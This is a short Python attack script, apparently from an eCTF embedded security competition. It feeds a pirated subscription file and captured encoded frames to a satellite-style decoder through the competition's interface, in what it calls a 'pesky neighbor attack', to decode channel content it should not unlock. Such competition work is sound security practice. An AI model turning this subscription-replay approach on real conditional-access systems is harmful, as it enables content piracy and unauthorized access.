import time
import sys
import struct

from ectf25.utils.decoder import DecoderIntf

ch1_frame = {"channel": 1, "timestamp": 2022208232906350, "encoded": "cdfa593ad2865ce1f383c851f463b12975a2268698ba4a426ee845337ec3ec4fbd93d7e37cf8207789adf906dfe29328a4dd8c3830c5a554bde670e762deb1f6d78eec225f2e03b8187653967807c47c51e1178bd1c7c9ba8da6e269a92da4a91b5e37b56e2bc8e9"}
ch2_frame = {"channel": 2, "timestamp": 2022208232906689, "encoded": "6f8bf7b5d826146ef2e252d49ca3dbfe2fff2fb22f37d0a7f8abe5298ae6e9b16ece6525c1dcc1dcf9d3ffc16cd4888022f2f96df394b10348c094316119b26d45ecd29eb45a214166a0170a1691c9aedcecb871348490abf454ed3b5d777a3c8b2191225ce7d57d"}
ch3_frame = {"channel": 3, "timestamp": 2022208232906836, "encoded": "3c23ec7e65683d33c6ae6855f5318c72547d92f5ea5123e4193b629e314dda05e06af70df0b5cf9ba0439632934090cd47d513e4bf050cdb613f8459389935e89ad6fb8c53315a99ea94c77f1f3115aad00f87bbce8a4f438e3138f68de65cbc0195c9dac0c2b906"}
ch4_frame = {"channel": 4, "timestamp": 2022208232906972, "encoded": "f25a9714e223d5914ae87265bfeb33c6b2da9bb4b1377626e13eeaecec2056f984ae8bd1be964bcedf44e1bca4fe30e3e2a2ed077f0e1c34832ce803fa52901b00a9392b835cf97bf43ca03cadf8848e007e70dc16a4e7ec9b5a339715cac7ead1c52d77e57e7039"}
ch0_frame = {"channel": 0, "timestamp": 2022208236331250, "encoded": "8bf2370255a4c53cc0e94691322a69f7a36c043a0ae882e5bd39db3118455a8d6d363b4c508ce69c8fb1cb1624e74a25ac829ae5502580bb506574e29280bf382de4caa062e37e32834c0330ca92de2cc529bac807f35a9bbf893dd2dc47855db3dbf27079f3cd36"}

pirated_subscription = open("pirated.sub", "rb").read()

if __name__ == "__main__":
    print("Running pesky neighbor attack")

    time.sleep(1)

    decoder = DecoderIntf(sys.argv[1])

    decoder.list()

    decoder.subscribe(pirated_subscription)
    decoder.decode(bytes.fromhex(ch3_frame["encoded"]))

    print("Successfully decoded earlier frame")
